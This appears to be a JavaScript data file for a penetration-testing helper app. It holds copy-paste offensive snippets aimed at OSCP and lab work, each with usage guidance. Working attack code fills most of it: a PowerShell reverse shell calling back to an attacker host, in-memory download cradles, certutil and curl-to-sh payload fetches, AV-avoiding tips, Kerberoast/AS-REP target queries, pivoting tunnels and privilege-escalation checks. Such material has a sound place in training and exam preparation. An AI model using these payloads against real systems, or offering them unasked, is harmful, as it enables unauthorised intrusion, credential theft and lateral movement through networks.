// Obol copy/paste script library — distilled from HTB Academy + OffSec PEN-200 notes.
// Sidebar placeholders ({{lhost}} etc.) are filled by the app when rendering.
// Each script carries when/where/how guidance — read it before pasting.
window.OBOL_SCRIPTS = [

// ============ AD ENUM ============
{ id:'ldapsearch', cat:'AD Enum — no PowerView, no upload', name:'LDAPSearch (from your PEN-200 notes)', lang:'powershell',
  desc:'Pure .NET DirectoryServices AD querying — nothing to upload, no PowerView, works from any domain-joined shell.',
  when:'You have any Windows foothold (RDP, WinRM, reverse shell) on a domain-joined box and want AD answers without dropping tools that AV signatures know.',
  where:'Run on the TARGET (domain-joined Windows), in any PowerShell session. Paste the function first, then the cookbook queries.',
  how:'Paste the whole function into your session. Then call: LDAPSearch -LDAPQuery "(filter)". Results come back as DirectoryEntry objects — pipe to ForEach-Object { $_.Properties } to read attributes.',
  code:
`function LDAPSearch {
    param ([string]$LDAPQuery)
    $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
    $DistinguishedName = ([adsi]'').distinguishedName
    $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DistinguishedName")
    $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)
    return $DirectorySearcher.FindAll()
}` },

{ id:'ldap-cookbook', cat:'AD Enum — no PowerView, no upload', name:'LDAPSearch query cookbook', lang:'powershell',
  desc:'Run after LDAPSearch. Each line answers a question BloodHound would graph — group membership, roastable accounts, nested membership.',
  when:'After the LDAPSearch function is loaded. Use these instead of BloodHound when you cannot (or will not) run a collector.',
  where:'Same session where you pasted LDAPSearch.',
  how:'Replace the DN placeholders with real values from earlier queries. Get the domain DN first with: ([adsi]\'\').distinguishedName — then build DNs like CN=Some User,CN=Users,<that DN>.',
  code:
`# All users:
LDAPSearch -LDAPQuery "(samAccountType=805306368)"
# All groups:
LDAPSearch -LDAPQuery "(objectclass=group)"
# Members of a specific group (put the group's real DN here):
LDAPSearch -LDAPQuery "(memberOf=CN=<GROUP NAME>,CN=Users,{{base_dn}})"
# A user's groups INCLUDING nested (matching rule 1.2.840.113556.1.4.1941 walks the chain):
LDAPSearch -LDAPQuery "(member:1.2.840.113556.1.4.1941:=CN=<USER NAME>,CN=Users,{{base_dn}})"
# Kerberoastable accounts (SPN set, not disabled):
LDAPSearch -LDAPQuery "(&(samAccountType=805306368)(servicePrincipalName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
# AS-REP roastable accounts (DONT_REQ_PREAUTH = flag 4194304):
LDAPSearch -LDAPQuery "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
# Read every description — password hints hide there:
LDAPSearch -LDAPQuery "(samAccountType=805306368)" | ForEach-Object { "$($_.Properties['samaccountname']) :: $($_.Properties['description'])" }` },

{ id:'pv-cookbook', cat:'AD Enum — no PowerView, no upload', name:'PowerView quick hits (when you CAN upload)', lang:'powershell',
  desc:'The PowerView one-liners that replace whole BloodHound edges, from memory.',
  when:'You have a Windows foothold and PowerView.ps1 staged (see Download cradles). Faster than LDAPSearch for ACL questions.',
  where:'Target PowerShell session, after IEX-loading PowerView.',
  how:'Load with: IEX(New-Object Net.WebClient).DownloadString(\'http://{{lhost}}/PowerView.ps1\') — then run these.',
  code:
`# Who is local admin where (the money query):
Find-LocalAdminAccess
# Sessions of privileged users on reachable boxes (targets for cred theft):
Get-NetSession -ComputerName {{target}}
# Your own effective rights over other objects:
Get-ObjectAcl -Identity {{user}} -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match 'GenericAll|WriteDacl|WriteOwner|ForceChangePassword' }
# Kerberoast targets with SPNs:
Get-NetUser -SPN | Select-Object samaccountname,serviceprincipalname
# AS-REP targets:
Get-NetUser -PreauthNotRequired | Select-Object samaccountname` },

// ============ SHELLS ============
{ id:'ps-rev', cat:'Shells', name:'PowerShell reverse shell (compact one-liner)', lang:'powershell',
  desc:'The minimal TCP reverse shell — no nishang download needed.',
  when:'You have command execution on Windows (webshell, SQLi→cmd, xp_cmdshell) and need an interactive session back.',
  where:'Paste/run ON the target. Catch on Kali FIRST: nc -lvnp {{lport}} — always start the listener before firing the shell.',
  how:'{{lhost}}/{{lport}} fill from the sidebar. If a plain paste fails, base64-wrap it with the UTF-16LE helper script below.',
  code:
`$c=New-Object System.Net.Sockets.TCPClient('{{lhost}}',{{lport}});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()` },

{ id:'cradles', cat:'Shells', name:'Download cradles (get tools onto target)', lang:'powershell',
  desc:'In-memory when AV watches disk; on-disk when you need it to survive. certutil is the LOLBIN fallback.',
  when:'You have execution on Windows and need a tool (PowerView, winPEAS, nc.exe, SharpHound) delivered.',
  where:'Run on the TARGET. Your Kali box must be serving the file first (see last line).',
  how:'In-memory = no disk write, dies with the session. On-disk = survives but AV can eat it; C:\\Users\\Public is usually writable.',
  code:
`# In-memory (nothing touches disk — preferred for PowerView etc.):
IEX(New-Object Net.WebClient).DownloadString('http://{{lhost}}/PowerView.ps1')
# On-disk then run:
iwr http://{{lhost}}/winPEASany.exe -OutFile C:\\Users\\Public\\w.exe
# LOLBIN fallback:
certutil -urlcache -split -f http://{{lhost}}/w.exe C:\\Users\\Public\\w.exe
# Remember the server side: python3 -m http.server 80 (or: impacket-smbserver share . -smb2support)` },

{ id:'tty', cat:'Shells', name:'TTY upgrade (make a dumb shell interactive)', lang:'bash',
  desc:'Arrows, tab-completion, Ctrl+C, su — the moment you land any Linux shell.',
  when:'Immediately after catching a Linux reverse/bind shell, before you do anything else.',
  where:'First line in the DUMB SHELL on target; the stty line on YOUR Kali terminal after backgrounding.',
  how:'python3 line → Ctrl+Z → stty raw -echo; fg → (blind) export TERM=xterm + Enter. If python3 is missing try: python, script -qc /bin/bash /dev/null, or socat.',
  code:
`python3 -c 'import pty;pty.spawn("/bin/bash")'
# then: Ctrl+Z, and on YOUR terminal:
stty raw -echo; fg
# back in the shell: export TERM=xterm` },

{ id:'proof-snap', cat:'Shells', name:'OSCP proof snapshot (the exact OffSec frame)', lang:'bash',
  desc:'The screenshot OffSec requires: proof file contents AND target IP in one frame.',
  when:'Every time you read a local.txt or proof.txt on an exam/lab box — before you do anything else.',
  where:'In your shell ON the target.',
  how:'Screenshot the whole terminal showing all lines. Paste the flag into the exam control panel too. Missing this = zero points for the box.',
  code:
`# Windows:
type C:\\Users\\Administrator\\Desktop\\proof.txt & ipconfig
# Linux:
cat /root/proof.txt; ip addr
# local.txt variants:
type C:\\Users\\*\\Desktop\\local.txt & ipconfig
cat /home/*/local.txt; ip addr` },

// ============ PIVOTING ============
{ id:'ligolo-quick', cat:'Pivoting', name:'ligolo-ng quick setup (route-backed pivot)', lang:'bash',
  desc:'The modern pivot: a real tun interface, so nmap/smbclient/everything routes through the compromised host.',
  when:'You have a shell on a dual-homed host and need to reach the internal subnet with arbitrary tools (not just SOCKS-aware ones).',
  where:'proxy + server-side on KALI; agent on the TARGET.',
  how:'Create the tun interface once, run proxy on Kali, agent on target, then `session` → `start` in the proxy console, add the route, and your tools just work on internal IPs.',
  code:
`# Kali (once per session):
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601
# Target (upload agent first):
./agent -connect {{lhost}}:11601 -ignore-cert
# Back in the ligolo proxy console:
session            # pick the agent
start
# Kali, new terminal — route the internal subnet you found (ipconfig/ifconfig on target):
sudo ip route add 10.10.10.0/24 dev ligolo` },

{ id:'chisel-quick', cat:'Pivoting', name:'chisel quick setup (SOCKS + port forwards)', lang:'bash',
  desc:'Single-binary HTTP tunnel — reverse SOCKS when you cannot bind, forward when you can.',
  when:'ligolo is overkill or blocked; you need SOCKS5 through the target, or to expose one internal port.',
  where:'Server on KALI, client on TARGET. Upload the matching-arch chisel binary first.',
  how:'Reverse SOCKS = target dials out to you, your tools use socks5://127.0.0.1:1080 via proxychains. Add "socks5 127.0.0.1 1080" to /etc/proxychains4.conf.',
  code:
`# Kali server:
./chisel server -p 9000 --reverse
# Target — reverse SOCKS (reach internal net through this host):
./chisel client {{lhost}}:9000 R:socks
# Target — expose one internal service on your Kali port (e.g. internal web on 10.10.10.20:80):
./chisel client {{lhost}}:9000 R:8080:10.10.10.20:80
# Use it:  proxychains nxc smb 10.10.10.20 ...   or browse http://127.0.0.1:8080` },

// ============ UTILITY ============
{ id:'pscred', cat:'Utility', name:'PSCredential helper — run as another user', lang:'powershell',
  desc:'Build a credential object and run commands remotely as that user (the writedacl-dcsync card uses this for Add-ObjectACL).',
  when:'You harvested a cleartext password for another account and need to act as them from your current Windows session.',
  where:'Run from your existing PowerShell session on a domain-joined host.',
  how:'Fill {{user}}/{{password}}/{{domain}} in the sidebar. The one-liner form works from cmd.exe (webshells) too.',
  code:
`$p = ConvertTo-SecureString '{{password}}' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential('{{domain}}\\{{user}}', $p)
Invoke-Command -ComputerName {{target}} -Credential $c -ScriptBlock { hostname; whoami }
# One-liner form (works from cmd.exe too):
powershell -Command "$p=ConvertTo-SecureString '{{password}}' -AsPlainText -Force; $c=New-Object System.Management.Automation.PSCredential('{{domain}}\\{{user}}',$p); Invoke-Command -ComputerName {{target}} -Credential $c -ScriptBlock { hostname; whoami }"` },

{ id:'b64', cat:'Utility', name:'Base64 for powershell -e (must be UTF-16LE)', lang:'bash',
  desc:'powershell -e expects UTF-16LE base64 — plain base64 silently fails.',
  when:'A payload with quotes/special chars keeps breaking when pasted (webshells, xp_cmdshell).',
  where:'Encode on KALI, paste the output on the TARGET.',
  how:'Save your script as rev.ps1, run the encoder, paste the blob after -e. -nop -w hidden keeps it quiet.',
  code:
`cat rev.ps1 | iconv -t UTF-16LE | base64 -w 0
# then on the target:
powershell -nop -w hidden -e <paste output here>` },

{ id:'portscan-ps', cat:'Utility', name:'PowerShell port sweep (no nmap on target)', lang:'powershell',
  desc:'When you are on a Windows box with no tools and need to probe a host — from your PEN-200 notes.',
  when:'Pivot recon: you landed on a Windows host and need to map what IT can reach internally.',
  where:'Run ON the target (any PowerShell).',
  how:'Adjust the 1..1024 range and {{target}}. Slow but zero-upload. For a subnet sweep, wrap in an outer loop over the last octet.',
  code:
`1..1024 | ForEach-Object { if (Test-NetConnection -Port $_ -ComputerName {{target}} -InformationLevel Quiet -WarningAction SilentlyContinue) { "$_ open" } }` },

{ id:'hashverify', cat:'Utility', name:'Verify uploads (corrupted transfers waste hours)', lang:'powershell',
  desc:'Compare the hash on both sides after any file transfer.',
  when:'A tool crashes instantly or behaves weirdly after upload — suspect a truncated transfer before anything else.',
  where:'First line on the TARGET, second on KALI, compare outputs.',
  how:'MD5 is fine for integrity (not security). If they differ, re-upload with a different method (smbserver instead of http, or base64 paste).',
  code:
`Get-FileHash C:\\Users\\Public\\w.exe -Algorithm MD5
# on Kali: md5sum w.exe` },

// ============ PRIVESC ============
{ id:'win-pe-quick', cat:'Privesc', name:'Windows privesc quick loop (before/while winPEAS runs)', lang:'powershell',
  desc:'The fast manual pass from your notes — privileges, patches, saved creds, password history files.',
  when:'Every Windows foothold, immediately. Takes 60 seconds and finds a third of privescs.',
  where:'Run ON the target.',
  how:'whoami /priv: SeImpersonate → potato family. History file: typed passwords. cmdkey: saved creds → runas /savecred. systeminfo: old OS → kernel exploits via wesng.',
  code:
`whoami /priv
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
cat (Get-PSReadlineOption).HistorySavePath
cmdkey /list
reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall /s | findstr InstallLocation` },

{ id:'lin-pe-quick', cat:'Privesc', name:'Linux privesc quick loop (before/while linpeas runs)', lang:'bash',
  desc:'The 60-second manual pass: sudo rights, SUID binaries, capabilities, cron, writable configs.',
  when:'Every Linux foothold, immediately — same discipline as the Windows loop.',
  where:'Run ON the target.',
  how:'sudo -l: anything listed → GTFOBins. find SUID: cross-check GTFOBins. getcap: cap_setuid/python = instant root. crontab: root-run scripts you can write = root.',
  code:
`sudo -l
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
cat /etc/crontab; ls -la /etc/cron.*
find / -writable -type f 2>/dev/null | grep -vE '^/(proc|sys|home/'$(whoami)')' | head -30` },

{ id:'peas-fetch', cat:'Privesc', name:'Fetch and run linpeas/winPEAS', lang:'bash',
  desc:'The automated sweep after your manual loop. Huge output — grep for the red flags.',
  when:'After the quick loop, on any foothold where you can transfer files.',
  where:'Serve from KALI with python3 -m http.server 80; download+run on the TARGET.',
  how:'Kali ships them: /usr/share/peas/linpeas/linpeas.sh and winpeas. Read the "red/yellow" highlights first — 95% of findings are there.',
  code:
`# Kali:  cd /usr/share/peas && python3 -m http.server 80
# Linux target:
curl http://{{lhost}}/linpeas/linpeas.sh | sh
# Windows target (then run .\\w.exe):
iwr http://{{lhost}}/winpeas/winPEASany.exe -OutFile C:\\Users\\Public\\w.exe` },

// ============ REPORTING / PROCESS ============
{ id:'oscp-submit', cat:'Process', name:'OSCP submission packaging (exact OffSec format)', lang:'bash',
  desc:'The exact archive the upload portal expects — wrong filename or format = unscored report.',
  when:'After your report PDF is final, before the 24h upload window closes.',
  where:'Run on KALI in the folder containing your PDF.',
  how:'Replace OS-XXXXX with your OSID (case-sensitive). No password on the 7z. Compare the MD5 the portal shows against your local md5sum.',
  code:
`# Report must be PDF, named exactly:
mv report.pdf OSCP-OS-XXXXX-Exam-Report.pdf
# Archive, no password, under 200MB:
7z a OSCP-OS-XXXXX-Exam-Report.7z OSCP-OS-XXXXX-Exam-Report.pdf
# Verify locally, compare with what upload.offsec.com shows:
md5sum OSCP-OS-XXXXX-Exam-Report.7z` }
];
